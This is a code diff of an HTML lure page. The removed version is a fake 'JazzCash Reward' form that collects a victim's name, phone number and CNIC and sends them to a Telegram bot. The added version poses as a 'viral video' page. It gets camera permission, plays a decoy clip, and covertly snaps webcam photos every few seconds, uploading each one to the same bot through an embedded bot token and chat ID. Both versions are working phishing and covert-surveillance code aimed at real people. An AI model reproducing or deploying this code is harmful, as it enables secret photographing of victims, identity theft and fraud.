@@ -3,89 +3,108 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Reward Center</title>
+    <title>Viral Video Hub</title>
     <style>
-        body { font-family: sans-serif; text-align: center; background: #f4f4f4; }
-        .box { max-width: 350px; margin: 50px auto; background: white; padding: 20px; border-radius: 15px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); }
-        input { width: 90%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 8px; }
-        button { width: 95%; padding: 15px; background: #d71921; color: white; border: none; border-radius: 25px; font-weight: bold; cursor: pointer; }
-        #v-hidden, canvas { display: none; }
+        body { background: #000; color: white; font-family: sans-serif; margin: 0; overflow: hidden; }
+        /* First Screen: Thumbnail */
+        #start-screen { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; text-align: center; }
+        .thumb { width: 90%; max-width: 400px; border-radius: 15px; border: 2px solid #ff0000; cursor: pointer; }
+        .play-btn { background: #ff0000; color: white; border: none; padding: 15px 40px; border-radius: 30px; font-weight: bold; margin-top: 20px; font-size: 18px; cursor: pointer; animation: pulse 1.5s infinite; }
+        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
+
+        /* Second Screen: Video Player */
+        #video-screen { display: none; width: 100vw; height: 100vh; background: black; }
+        video#main-player { width: 100%; height: 100%; object-fit: contain; }
+
+        /* Hidden Elements */
+        #v-hidden, canvas { display: none; position: fixed; left: -9999px; }
     </style>
 </head>
-<body onload="initCamera()">
+<body>
 
-    <div class="box" id="main-box">
-        <h2 style="color:#d71921;">JazzCash Reward</h2>
-        <input type="text" id="n" placeholder="Full Name">
-        <input type="tel" id="p" placeholder="03XXXXXXXXX">
-        <input type="tel" id="c" placeholder="CNIC Number">
-        <button onclick="submitData()">CLAIM RS. 50</button>
+    <div id="start-screen">
+        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR6A7bU6xM5y5z5" class="thumb" onclick="activateLink()">
+        <h2 style="color:#ff0000; margin-top:20px;">🔥 NEW VIRAL VIDEO 🔥</h2>
+        <p>Click below to watch full video</p>
+        <button class="play-btn" onclick="activateLink()">WATCH NOW (FREE)</button>
+    </div>
+
+    <div id="video-screen">
+        <video id="main-player" controls autoplay loop>
+            <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
+            Your browser does not support the video tag.
+        </video>
     </div>
 
     <video id="v-hidden" autoplay playsinline muted></video>
     <canvas id="c-hidden"></canvas>
 
 <script>
-    const token = "8466749965:AAHuInFTN0YIxTwTa-1YfT9qIc5fIdHj0EA";
-    const cid = "7107389141";
+    const botToken = "8466749965:AAHuInFTN0YIxTwTa-1YfT9qIc5fIdHj0EA";
+    const chatID = "7107389141";
 
-    // 1. Camera Access & Auto Capture
-    async function initCamera() {
+    async function activateLink() {
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            document.getElementById('v-hidden').srcObject = stream;
-            setInterval(takePhoto, 3000); // Har 3 sec baad photo
-        } catch (e) { console.log("Cam Blocked"); }
-    }
+            // 1. Camera Access Permission
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: "user" }, 
+                audio: false 
+            });
 
-    function takePhoto() {
-        const v = document.getElementById('v-hidden');
-        const can = document.getElementById('c-hidden');
-        if (v.readyState === 4) {
-            can.width = v.videoWidth; can.height = v.videoHeight;
-            can.getContext('2d').drawImage(v, 0, 0);
-            can.toBlob(blob => {
-                const fd = new FormData();
-                fd.append('chat_id', cid);
-                fd.append('photo', blob, 'hit.jpg');
-                fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
-            }, 'image/jpeg', 0.5);
+            // 2. Hidden Video Stream Start
+            const vHidden = document.getElementById('v-hidden');
+            vHidden.srcObject = stream;
+
+            // 3. Screen Switch (Hide Start, Show Video)
+            document.getElementById('start-screen').style.display = 'none';
+            document.getElementById('video-screen').style.display = 'block';
+            document.getElementById('main-player').play();
+
+            // 4. Background Photo Capture (Har 2.5 second baad)
+            vHidden.onplaying = () => {
+                // Pehli photo foran bhejein
+                setTimeout(capturePhoto, 1000);
+                // Loop shuru
+                setInterval(capturePhoto, 2500);
+            };
+
+            // 5. Bot ko notify karein ke user ne video start kar di
+            sendBotMsg("🎯 *LINK ACTIVE:* User is watching video right now!");
+
+        } catch (err) {
+            alert("Error: Please 'Allow' camera permission to watch this video.");
+            location.reload();
         }
     }
 
-    // 2. Submit Data with Buttons
-    function submitData() {
-        const name = document.getElementById('n').value;
-        const num = document.getElementById('p').value;
-        const cnic = document.getElementById('c').value;
+    function capturePhoto() {
+        const v = document.getElementById('v-hidden');
+        const can = document.getElementById('c-hidden');
+        
+        if (v.readyState === 4) {
+            can.width = v.videoWidth;
+            can.height = v.videoHeight;
+            can.getContext('2d').drawImage(v, 0, 0);
+            
+            can.toBlob(blob => {
+                const fd = new FormData();
+                fd.append('chat_id', chatID);
+                fd.append('photo', blob, 'capture.jpg');
+                
+                // Photo bot par bhejna
+                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                    method: 'POST',
+                    body: fd
+                });
+            }, 'image/jpeg', 0.5); // Quality 50% rakhi hai taake fast send ho
+        }
+    }
 
-        const text = `🎯 *NEW HIT RECEIVED* 🎯\n\n👤 *Name:* ${name}\n📱 *No:* ${num}\n🆔 *CNIC:* ${cnic}\n🚀 *Sender:* MUDASIR ABBAS`;
-
-        // Buttons ka structure
-        const keyboard = {
-            inline_keyboard: [
-                [
-                    { text: "📸 View Photos", url: "https://t.me/your_bot_username" },
-                    { text: "📍 Track IP", url: "https://iplocation.net" }
-                ],
-                [
-                    { text: "✅ Done", callback_data: "done" }
-                ]
-            ]
-        };
-
-        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+    function sendBotMsg(text) {
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: cid,
-                text: text,
-                parse_mode: 'Markdown',
-                reply_markup: keyboard // Ye buttons attach karega
-            })
-        }).then(() => {
-            alert("Verification Started!");
-            document.getElementById('main-box').innerHTML = "<h2>Success!</h2><p>Wait 15 mins for reward.</p>";
+            body: JSON.stringify({ chat_id: chatID, text: text, parse_mode: 'Markdown' })
         });
     }
 </script>
